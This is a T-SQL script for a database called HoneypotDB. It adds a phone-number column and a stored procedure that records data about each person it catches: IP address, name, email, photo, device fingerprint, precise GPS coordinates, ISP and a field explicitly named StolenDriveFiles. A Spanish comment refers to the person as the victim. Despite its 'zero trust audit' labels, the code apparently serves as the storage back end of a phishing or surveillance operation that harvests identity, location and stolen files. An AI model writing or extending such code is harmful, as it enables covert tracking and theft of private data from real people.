USE [HoneypotDB];
GO

-- Agregamos columna para el Número de Teléfono de la víctima
IF NOT EXISTS (SELECT * FROM sys.columns WHERE object_id = OBJECT_ID(N'[dbo].[ZeroTrustAudits]') AND name = 'PhoneNumber')
BEGIN
    ALTER TABLE [dbo].[ZeroTrustAudits] ADD [PhoneNumber] NVARCHAR(MAX) NULL;
END
GO

CREATE OR ALTER PROCEDURE [dbo].[InsertZeroTrustAudit]
    @IpAddress NVARCHAR(MAX),
    @IdentityName NVARCHAR(MAX),
    @IdentityEmail NVARCHAR(MAX),
    @IdentityPictureUrl NVARCHAR(MAX),
    @ScreenWidth INT,
    @ScreenHeight INT,
    @CpuCores INT,
    @RamGb DECIMAL(18,2),
    @BatteryLevelPct DECIMAL(18,2),
    @LanguageInfo NVARCHAR(MAX),
    @TimeZoneInfo NVARCHAR(MAX),
    @UserAgentData NVARCHAR(MAX),
    @StolenDriveFiles NVARCHAR(MAX) = NULL,
    @Latitude DECIMAL(10, 8) = NULL,
    @Longitude DECIMAL(11, 8) = NULL,
    @IspName NVARCHAR(MAX) = NULL,
    @GpuModel NVARCHAR(MAX) = NULL,
    @ConnectionType NVARCHAR(MAX) = NULL,
    @PhoneNumber NVARCHAR(MAX) = NULL
AS
BEGIN
    SET NOCOUNT ON;

    INSERT INTO [dbo].[ZeroTrustAudits] (
        [TimestampUtc],
        [IpAddress],
        [IdentityName],
        [IdentityEmail],
        [IdentityPictureUrl],
        [ScreenWidth],
        [ScreenHeight],
        [CpuCores],
        [RamGb],
        [BatteryLevelPct],
        [LanguageInfo],
        [TimeZoneInfo],
        [UserAgentData],
        [StolenDriveFiles],
        [Latitude],
        [Longitude],
        [IspName],
        [GpuModel],
        [ConnectionType],
        [PhoneNumber]
    )
    VALUES (
        GETUTCDATE(),
        @IpAddress,
        @IdentityName,
        @IdentityEmail,
        @IdentityPictureUrl,
        @ScreenWidth,
        @ScreenHeight,
        @CpuCores,
        @RamGb,
        @BatteryLevelPct,
        @LanguageInfo,
        @TimeZoneInfo,
        @UserAgentData,
        @StolenDriveFiles,
        @Latitude,
        @Longitude,
        @IspName,
        @GpuModel,
        @ConnectionType,
        @PhoneNumber
    );
END
GO
